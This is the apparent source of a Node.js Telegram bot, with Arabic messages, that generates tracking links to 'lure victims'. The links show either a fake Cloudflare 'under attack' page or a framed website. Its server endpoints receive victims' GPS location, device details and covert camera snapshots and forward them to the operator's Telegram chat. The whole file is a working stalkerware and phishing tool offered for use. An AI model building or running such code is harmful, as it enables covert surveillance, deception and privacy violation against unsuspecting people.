const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// قم بتعديل الرابط الخاص بك هنا
var hostURL = "https://trackdown.grayman21.repl.co";
// تبديل لمختصرات الروابط
var use1pt = false;

app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/abwalramah");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/abwalramah");
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text == "🌐 أدخل الرابط الخاص بك") {
    createLink(chatId, msg.text);
  }

  if (msg.text == "/start") {
    var m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط", callback_data: "crenew" }]] })
    };

    bot.sendMessage(chatId, `مرحبًا ${msg.chat.first_name}! يمكنك استخدام هذا الروبوت لتتبع الأشخاص من خلال رابط بسيط. يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز والتقاط صور الكاميرا.\n\nاكتب /help لمزيد من المعلومات.`, m);
  }
  else if (msg.text == "/create") {
    createNew(chatId);
  }
  else if (msg.text == "/help") {
    bot.sendMessage(chatId, `من خلال هذا الروبوت يمكنك تتبع الأشخاص ببساطة عن طريق إرسال رابط بسيط.\n\nأرسل /create للبدء، وبعد ذلك سيطلب منك إدخال عنوان URL الذي سيتم استخدامه في إطار لجذب الضحايا.\nبعد استلام الرابط، سيقوم بإرسال لك رابطين يمكنك استخدامهما لتتبع الأشخاص.\n\nالمواصفات:\n\n1. رابط Cloudflare: سيظهر صفحة Cloudflare تحت هجوم لجمع المعلومات ومن ثم سيتم توجيه الضحية إلى الرابط المستهدف.\n2. رابط WebView: سيظهر موقع ويب (مثل بينغ، مواقع التعارف إلخ) باستخدام إطار لجمع المعلومات. ( ⚠️ قد لا تعمل العديد من المواقع بهذه الطريقة إذا كان لديهم رأس x-frame موجود. على سبيل المثال: https://google.com )\n\n تم إنشاء هذا البوت بواسطة Al-Naizak`);
  }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});
bot.on('polling_error', (error) => {
  //console.log(error.code); 
});

async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

    var url = cid.toString(36) + '/' + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "إنشاء رابط جديد", callback_data: "crenew" }]]
      })
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

      var f = "", g = "";

      for (var c in x) {
        f += x[c] + "\n";
      }

      for (var c in y) {
        g += y[c] + "\n";
      }

      bot.sendMessage(cid, `تم إنشاء الروابط بنجاح. يمكنك استخدام أي من الروابط التالية.\n\nالرابط: ${msg}\n\n✅ روابطك\n\n🌐 رابط Cloudflare\n${f}\n\n🌐 رابط WebView\n${g}`, m);
    }
    else {

      bot.sendMessage(cid, `تم إنشاء الروابط بنجاح.\nالرابط: ${msg}\n\n✅ روابطك\n\n🌐 رابط Cloudflare\n${cUrl}\n\n🌐 رابط WebView\n${wUrl}`, m);
    }
  }
  else {
    bot.sendMessage(cid, `⚠️ يرجى إدخال رابط صالح، بما في ذلك http أو https.`);
    createNew(cid);
  }
}

function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `🌐 أدخل الرابط الخاص بك`, mk);
}

app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `خط العرض: ${lat}\nخط الطول: ${lon}\nالدقة: ${acc} أمتار`);
    res.send("تم");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("تم");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {
    var buffer = Buffer.from(img, 'base64');
    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };

    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }

    res.send("تم");
  }
});

app.listen(5000, () => {
  console.log("تعمل التطبيق على المنفذ 5000!");
});
